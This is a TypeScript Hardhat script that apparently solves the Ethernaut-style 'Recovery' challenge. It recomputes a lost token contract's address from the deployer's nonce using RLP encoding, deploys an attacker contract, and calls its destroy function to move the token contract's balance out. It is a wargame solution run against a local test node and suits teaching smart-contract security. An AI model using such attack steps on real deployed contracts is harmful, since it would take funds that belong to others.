import { BigNumber } from "ethers";
import { ethers } from "hardhat";

//Fit player address chosen from hardhat node addresses and contract address (current lvl instance)
const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";
const CONTRACT_ADDRESS = "0xf3A0988DCDfddf56861be7413ce85dB4402bDC82";

async function main() {
const signer = await ethers.getSigner(PLAYER_ADDRESS);
const contract = await ethers.getContractAt("Recovery",CONTRACT_ADDRESS, signer);

const attackerContractFactory = await ethers.getContractFactory("RecoveryAttack", signer);

//HACK STEPS 

// 1. Recompute the SimpleToken address(1). We need to get the nonce from the contract Recovery.
// It represents the number of deployments made (new keyword/ create opcodes).

let nonceFromContract = await ethers.provider.getTransactionCount(contract.address);
console.log("This is the current nonce of Recovery contract account: ", nonceFromContract);

// 2. Recompute the SimpleToken address(2). Create transaction and derive token address.
// We have to substract 1 to the nonce to be 1, the value it had at token contract creation.

    //2.1 Using ethers helper functions

// const tx = {
//     from: contract.address,
//     nonce: (nonceFromContract - 1)
// }
// const deployedSimpleTokenAddress = ethers.utils.getContractAddress(tx);
// console.log("SimpleToken address is: ", deployedSimpleTokenAddress);

    //2.2 Using RLP encoding

const nonce = BigNumber.from(nonceFromContract -1).toHexString()
console.log("Nonce in hex is: ", nonce)
const rlp = ethers.utils.RLP.encode([contract.address, nonce ]);
const encodedAddress = ethers.utils.keccak256(rlp);
const deployedSimpleTokenAddress = "0x" + encodedAddress.substring(26);
console.log("SimpleToken address is: ", deployedSimpleTokenAddress);



// 3. Deploy attacker contract.
// Check the balance of SimpleToken contract. Call attacker contract function and re-check.

const attackerContract = await attackerContractFactory.deploy(deployedSimpleTokenAddress);
console.log("Deployed attacker contract address: ", attackerContract.address );
console.log("Current balance of SimpleToken: ", await ethers.provider.getBalance(deployedSimpleTokenAddress));
await attackerContract.callToDestroy();
console.log("Now, balance of SimpleToken is: ", await ethers.provider.getBalance(deployedSimpleTokenAddress));

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
